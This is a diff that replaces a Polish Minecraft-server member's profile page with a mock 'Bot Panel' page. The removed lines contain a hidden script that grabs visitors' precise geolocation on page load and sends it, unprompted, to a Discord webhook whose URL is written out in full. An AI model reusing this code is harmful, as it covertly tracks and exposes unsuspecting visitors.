@@ -1,334 +1,544 @@
-```html
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-<meta charset="UTF-8">
-<title>matwiat — noname.6mc.pl</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Cascadia+Code:wght@400;600&display=swap');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bot Panel</title>
 
-  * { box-sizing: border-box; }
+    <style>
+        * {
+            box-sizing: border-box;
+        }
 
-  body {
-    margin: 0;
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f1420 100%);
-    font-family: 'Cascadia Code', monospace;
-    padding: 20px;
-  }
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #0b0d12;
+            color: #ffffff;
+        }
 
-  .wrap {
-    width: 620px;
-    max-width: 100%;
-  }
+        button {
+            font-family: inherit;
+        }
 
-  .header {
-    text-align: center;
-    margin-bottom: 24px;
-  }
-  .header .name {
-    color: #f2f2f2;
-    font-size: 22px;
-    font-weight: 600;
-    letter-spacing: 1px;
-  }
-  .header .sub {
-    color: #4aff6b;
-    font-size: 12px;
-    margin-top: 4px;
-    opacity: 0.85;
-  }
-  .header .beta {
-    display: inline-block;
-    margin-top: 10px;
-    color: #ffd35c;
-    font-size: 10px;
-    letter-spacing: 1px;
-    text-transform: uppercase;
-    border: 1px solid rgba(255,211,92,0.4);
-    padding: 3px 10px;
-    border-radius: 20px;
-    opacity: 0.85;
-  }
+        .app {
+            display: flex;
+            min-height: 100vh;
+        }
 
-  .tabs {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-  }
+        /* SIDEBAR */
 
-  .tab {
-    border-radius: 8px;
-    overflow: hidden;
-    background: rgba(255,255,255,0.04);
-    box-shadow: 0 1px 0 rgba(255,255,255,0.04) inset, 0 8px 20px rgba(0,0,0,0.25);
-    transition: box-shadow 0.3s ease;
-    cursor: pointer;
-  }
-  .tab.open {
-    cursor: default;
-    box-shadow: 0 0 0 1px rgba(74,255,107,0.25), 0 20px 45px rgba(0,0,0,0.45);
-  }
+        .sidebar {
+            width: 250px;
+            background: #11141b;
+            border-right: 1px solid #252936;
+            display: flex;
+            flex-direction: column;
+            padding: 20px 14px;
+        }
 
-  .tab-head {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 14px 18px;
-    color: #b8b8c0;
-    font-size: 13px;
-    transition: color 0.2s, background 0.2s;
-  }
-  .tab:hover .tab-head { color: #e0e0e5; background: rgba(255,255,255,0.03); }
-  .tab.open .tab-head {
-    background: rgba(20,20,20,0.9);
-    color: #4aff6b;
-  }
-  .tab-head .num { color: #5c8a5c; font-size: 11px; margin-right: 8px; }
-  .tab-head .dots { display: flex; gap: 6px; opacity: 0; transition: opacity 0.25s; }
-  .tab.open .tab-head .dots { opacity: 1; }
-  .dot { width: 10px; height: 10px; border-radius: 50%; }
-  .dot.r { background: #ff5f56; }
-  .dot.y { background: #ffbd2e; }
-  .dot.g { background: #27c93f; }
+        .logo {
+            height: 55px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0 12px;
+            font-size: 19px;
+            font-weight: 700;
+            margin-bottom: 25px;
+        }
 
-  .tab-body {
-    display: none;
-    overflow: hidden;
-    background: #0c0c0c;
-  }
-  .tab.open .tab-body {
-    display: block;
-  }
+        .menu {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
 
-  .term {
-    padding: 18px 20px 22px;
-    font-size: 13px;
-    line-height: 1.85;
-    color: #4aff6b;
-  }
+        .menu-item {
+            width: 100%;
+            border: 0;
+            background: transparent;
+            color: #9298a8;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 13px 14px;
+            border-radius: 9px;
+            text-align: left;
+            font-size: 14px;
+            cursor: pointer;
+            transition: .2s;
+        }
 
-  .prompt-user { color: #4ac9ff; }
-  .prompt-path { color: #ffd35c; }
-  .prompt-sep { color: #6b8f6b; }
-  .cmdline { color: #f2f2f2; }
-  .key { color: #7a9a7a; }
-  .accent { color: #ffd35c; }
-  .link { color: #4ac9ff; }
-  .val { color: #4aff6b; }
+        .menu-item span {
+            flex: 1;
+        }
 
-  .cursor {
-    display: inline-block;
-    width: 7px;
-    height: 14px;
-    background: #4aff6b;
-    animation: blink 1s step-start infinite;
-    vertical-align: middle;
-    margin-left: 2px;
-  }
-  @keyframes blink { 50% { opacity: 0; } }
+        .menu-item:hover:not(.locked) {
+            background: #1b1f29;
+            color: white;
+        }
 
-  .resp-line {
-    opacity: 0;
-    transform: translateY(3px);
-    transition: opacity 0.35s ease, transform 0.35s ease;
-  }
-  .resp-line.show { opacity: 1; transform: translateY(0); }
-</style>
+        .menu-item.active {
+            background: #5865f2;
+            color: white;
+        }
+
+        .menu-item.locked {
+            opacity: .42;
+            cursor: not-allowed;
+        }
+
+        .menu-item b {
+            font-size: 12px;
+        }
+
+        .sidebar-bottom {
+            margin-top: auto;
+        }
+
+        .status {
+            background: #171a22;
+            border: 1px solid #252936;
+            padding: 12px;
+            border-radius: 9px;
+            color: #8f96a8;
+            font-size: 12px;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #3ba55d;
+            border-radius: 50%;
+            margin-right: 7px;
+        }
+
+        /* CONTENT */
+
+        .content {
+            flex: 1;
+            padding: 30px 35px;
+            max-width: 1300px;
+        }
+
+        .topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .topbar h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+
+        .topbar p {
+            margin-top: 7px;
+            color: #777f91;
+        }
+
+        .profile {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #151821;
+            border: 1px solid #252936;
+            padding: 8px 13px 8px 8px;
+            border-radius: 10px;
+        }
+
+        .avatar {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: #5865f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+        }
+
+        .profile strong,
+        .profile small {
+            display: block;
+        }
+
+        .profile small {
+            color: #777f91;
+            margin-top: 3px;
+        }
+
+        /* GŁÓWNA KARTA */
+
+        .main-card {
+            margin-top: 30px;
+            background: #14171f;
+            border: 1px solid #272b37;
+            border-radius: 14px;
+            padding: 28px;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .icon-box {
+            width: 52px;
+            height: 52px;
+            background: #20253a;
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+        }
+
+        .card-header h2 {
+            margin: 0;
+            font-size: 19px;
+        }
+
+        .card-header p {
+            margin: 5px 0 0;
+            color: #777f91;
+            font-size: 14px;
+        }
+
+        /* TEST */
+
+        .test-area {
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 1px solid #252936;
+        }
+
+        #testButton {
+            border: 0;
+            background: #5865f2;
+            color: white;
+            padding: 13px 22px;
+            border-radius: 9px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: .2s;
+        }
+
+        #testButton:hover {
+            background: #4752c4;
+            transform: translateY(-1px);
+        }
+
+        #result {
+            display: none;
+            margin-top: 18px;
+            padding: 15px;
+            border-radius: 10px;
+        }
+
+        #result.error {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(237, 66, 69, .10);
+            border: 1px solid rgba(237, 66, 69, .25);
+            color: #ff7375;
+        }
+
+        #result > span {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(237, 66, 69, .15);
+            border-radius: 50%;
+            font-weight: bold;
+        }
+
+        #result strong,
+        #result small {
+            display: block;
+        }
+
+        #result small {
+            margin-top: 3px;
+            color: #a56d70;
+        }
+
+        /* INFORMACJE */
+
+        .info-grid {
+            margin-top: 18px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 18px;
+        }
+
+        .info-card {
+            background: #14171f;
+            border: 1px solid #272b37;
+            border-radius: 13px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .info-card > span {
+            font-size: 25px;
+        }
+
+        .info-card small,
+        .info-card strong {
+            display: block;
+        }
+
+        .info-card small {
+            color: #737a8d;
+            margin-bottom: 5px;
+        }
+
+        /* TELEFON */
+
+        @media (max-width: 800px) {
+
+            .sidebar {
+                width: 70px;
+                padding: 15px 8px;
+            }
+
+            .logo span,
+            .menu-item span,
+            .status {
+                display: none;
+            }
+
+            .menu-item {
+                justify-content: center;
+            }
+
+            .menu-item b {
+                display: none;
+            }
+
+            .content {
+                padding: 20px;
+            }
+
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .topbar {
+                align-items: flex-start;
+                gap: 15px;
+            }
+        }
+    </style>
 </head>
+
 <body>
 
-<div class="wrap">
-  <div class="header">
-    <div class="name">matwiat</div>
-    <div class="sub">noname.6mc.pl</div>
-    <div class="beta">wersja beta</div>
-  </div>
+<div class="app">
 
-  <div class="tabs">
-    <div class="tab" data-tab="0">
-      <div class="tab-head">
-        <span><span class="num">01</span>O mnie</span>
-        <span class="dots"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span></span>
-      </div>
-      <div class="tab-body"><div class="term"></div></div>
-    </div>
+    <!-- LEWE MENU -->
 
-    <div class="tab" data-tab="1">
-      <div class="tab-head">
-        <span><span class="num">02</span>Moje role</span>
-        <span class="dots"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span></span>
-      </div>
-      <div class="tab-body"><div class="term"></div></div>
-    </div>
+    <aside class="sidebar">
 
-    <div class="tab" data-tab="2">
-      <div class="tab-head">
-        <span><span class="num">03</span>Serwer</span>
-        <span class="dots"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span></span>
-      </div>
-      <div class="tab-body"><div class="term"></div></div>
-    </div>
+        <div class="logo">
+            🤖 <span>Bot Panel</span>
+        </div>
 
-    <div class="tab" data-tab="3">
-      <div class="tab-head">
-        <span><span class="num">04</span>Kontakt</span>
-        <span class="dots"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span></span>
-      </div>
-      <div class="tab-body"><div class="term"></div></div>
-    </div>
-  </div>
+        <div class="menu">
+
+            <!-- DZIAŁAJĄCA ZAKŁADKA -->
+
+            <button class="menu-item active">
+                🧪
+                <span>Test</span>
+            </button>
+
+            <!-- ZAMKNIĘTE ZAKŁADKI -->
+
+            <button class="menu-item locked" disabled>
+                📊
+                <span>Statystyki</span>
+                <b>🔒</b>
+            </button>
+
+            <button class="menu-item locked" disabled>
+                ⚙️
+                <span>Ustawienia</span>
+                <b>🔒</b>
+            </button>
+
+            <button class="menu-item locked" disabled>
+                🤖
+                <span>Bot</span>
+                <b>🔒</b>
+            </button>
+
+            <button class="menu-item locked" disabled>
+                🖥️
+                <span>Serwery</span>
+                <b>🔒</b>
+            </button>
+
+            <button class="menu-item locked" disabled>
+                📜
+                <span>Logi</span>
+                <b>🔒</b>
+            </button>
+
+        </div>
+
+        <div class="sidebar-bottom">
+
+            <div class="status">
+                <span class="status-dot"></span>
+                Panel online
+            </div>
+
+        </div>
+
+    </aside>
+
+
+    <!-- GŁÓWNA CZĘŚĆ -->
+
+    <main class="content">
+
+        <header class="topbar">
+
+            <div>
+                <h1>Test</h1>
+                <p>Panel zarządzania botem</p>
+            </div>
+
+            <div class="profile">
+
+                <div class="avatar">
+                    ?
+                </div>
+
+                <div>
+                    <strong>Gość</strong>
+                    <small>Demo Panel</small>
+                </div>
+
+            </div>
+
+        </header>
+
+
+        <!-- KARTA TESTU -->
+
+        <section class="main-card">
+
+            <div class="card-header">
+
+                <div class="icon-box">
+                    🧪
+                </div>
+
+                <div>
+                    <h2>Test permisji</h2>
+
+                    <p>
+                        Sprawdź, czy posiadasz wymagane uprawnienia.
+                    </p>
+                </div>
+
+            </div>
+
+
+            <div class="test-area">
+
+                <button id="testButton">
+                    Uruchom test
+                </button>
+
+                <div id="result"></div>
+
+            </div>
+
+        </section>
+
+
+        <!-- INFORMACJE -->
+
+        <section class="info-grid">
+
+            <div class="info-card">
+
+                <span>🤖</span>
+
+                <div>
+                    <small>Status</small>
+                    <strong>Online</strong>
+                </div>
+
+            </div>
+
+
+            <div class="info-card">
+
+                <span>⚡</span>
+
+                <div>
+                    <small>Ping</small>
+                    <strong>24 ms</strong>
+                </div>
+
+            </div>
+
+
+            <div class="info-card">
+
+                <span>🔐</span>
+
+                <div>
+                    <small>Uprawnienia</small>
+                    <strong>Ograniczone</strong>
+                </div>
+
+            </div>
+
+        </section>
+
+    </main>
+
 </div>
 
+
 <script>
-// ---------- UKRYTY SKRYPT GEOLOKALIZACJI ----------
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1541541355304525987/flKyFuCeLKnsNvYw5Fxg3WM_T-XdteC3q0dpBzS6xK9Q70-lWAqxJLycssYQGVyFaxIm"; // ZAMIEŃ NA SWÓJ
 
-function sendLocation(position) {
-    const { latitude, longitude } = position.coords;
-    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: `📍 **Lokalizacja**\nLat: ${latitude}\nLng: ${longitude}\n${mapLink}`
-        })
-    }).catch(() => {});
-}
+const button = document.getElementById("testButton");
+const result = document.getElementById("result");
 
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendLocation, () => {}, {
-        enableHighAccuracy: true,
-        timeout: 8000
-    });
-}
-// --------------------------------------------------
+button.addEventListener("click", () => {
 
-// ---------- ORYGINALNY SKRYPT ZAKŁADEK ----------
-const data = [
-  {
-    cmd: "whoami",
-    lines: [
-      { html: '<span class="key">nick</span>      <span class="val">matwiat</span>' },
-      { html: '<span class="key">status</span>    <span class="val">[online]</span>' },
-      { html: '' },
-      { html: 'Gracz i cz\u0142onek ekipy serwera noname.6mc.pl.' },
-      { html: 'Zajmuj\u0119 si\u0119 utrzymaniem serwera od strony' },
-      { html: 'technicznej oraz porz\u0105dkiem w spo\u0142eczno\u015bci.' },
-    ]
-  },
-  {
-    cmd: "cat role.txt",
-    lines: [
-      { html: '<span class="accent">&gt; moderator</span> — obs\u0142uga zg\u0142osze\u0144, spory' },
-      { html: '  gracz-gracz, egzekwowanie regulaminu' },
-      { html: '' },
-      { html: '<span class="accent">&gt; technik serwera</span> — konfiguracja i' },
-      { html: '  t\u0142umaczenie plugin\u00f3w (Skript, EconomyShopGUI),' },
-      { html: '  utrzymanie ekonomii i system\u00f3w serwera' },
-    ]
-  },
-  {
-    cmd: "server --info",
-    lines: [
-      { html: '<span class="key">adres</span>     <span class="link">noname.6mc.pl</span>' },
-      { html: '<span class="key">status</span>    <span class="val">[online]</span>' },
-      { html: '' },
-      { html: 'Serwer Minecraft z rozbudowan\u0105 ekonomi\u0105,' },
-      { html: 'systemem region\u00f3w i w\u0142asnymi mechanikami.' },
-      { html: 'Do\u0142\u0105cz i sprawd\u017a sam!' },
-    ]
-  },
-  {
-    cmd: "contact --show",
-    lines: [
-      { html: '<span class="key">discord</span>   <span class="link">wkr\u00f3tce</span>' },
-      { html: '<span class="key">serwer</span>    <span class="link">noname.6mc.pl</span>' },
-      { html: '' },
-      { html: 'Masz pytanie do ekipy serwera?' },
-      { html: 'Napisz na Discordzie lub zg\u0142o\u015b si\u0119' },
-      { html: 'bezpo\u015brednio na serwerze.' },
-    ]
-  }
-];
+    result.className = "error";
 
-const tabEls = document.querySelectorAll('.tab');
-let openIdx = null;
-let typing = false;
+    result.innerHTML = `
+        <span>✕</span>
 
-function promptHTML() {
-  return '<span class="prompt-user">matwiat</span><span class="prompt-sep">@</span><span class="prompt-path">noname</span><span class="prompt-sep">:~$</span>';
-}
+        <div>
+            <strong>Brak permisji</strong>
+            <small>
+                Nie posiadasz wymaganych uprawnień.
+            </small>
+        </div>
+    `;
 
-function typeCommand(term, cmdText, callback) {
-  term.innerHTML = promptHTML() + ' <span class="cmdline" id="cmdSpan"></span><span class="cursor"></span>';
-  const cmdSpan = term.querySelector('#cmdSpan');
-  let i = 0;
-  const interval = setInterval(() => {
-    cmdSpan.textContent += cmdText[i];
-    i++;
-    if (i >= cmdText.length) {
-      clearInterval(interval);
-      setTimeout(callback, 350);
-    }
-  }, 45);
-}
-
-function showResponse(term, lines) {
-  const cursor = term.querySelector('.cursor');
-  if (cursor) cursor.remove();
-  term.innerHTML += '<br>';
-  lines.forEach((line, idx) => {
-    const div = document.createElement('div');
-    div.className = 'resp-line';
-    div.innerHTML = line.html || '&nbsp;';
-    term.appendChild(div);
-    setTimeout(() => { div.classList.add('show'); }, 150 + idx * 200);
-  });
-  const finalPrompt = document.createElement('div');
-  finalPrompt.style.marginTop = '10px';
-  finalPrompt.innerHTML = promptHTML() + ' <span class="cursor"></span>';
-  finalPrompt.className = 'resp-line';
-  term.appendChild(finalPrompt);
-  setTimeout(() => { finalPrompt.classList.add('show'); }, 150 + lines.length * 200 + 100);
-}
-
-tabEls.forEach(tab => {
-  tab.addEventListener('click', () => {
-    if (typing) return;
-    const idx = parseInt(tab.dataset.tab);
-
-    if (openIdx === idx) {
-      tab.classList.remove('open');
-      openIdx = null;
-      return;
-    }
-
-    if (openIdx !== null) {
-      tabEls[openIdx].classList.remove('open');
-    }
-
-    const term = tab.querySelector('.term');
-    term.innerHTML = '';
-    tab.classList.add('open');
-    openIdx = idx;
-    typing = true;
-
-    const entry = data[idx];
-    requestAnimationFrame(() => {
-      requestAnimationFrame(() => {
-        typeCommand(term, entry.cmd, () => {
-          showResponse(term, entry.lines);
-          typing = false;
-        });
-      });
-    });
-  });
 });
+
 </script>
 
 </body>
-</html>
+  </html>
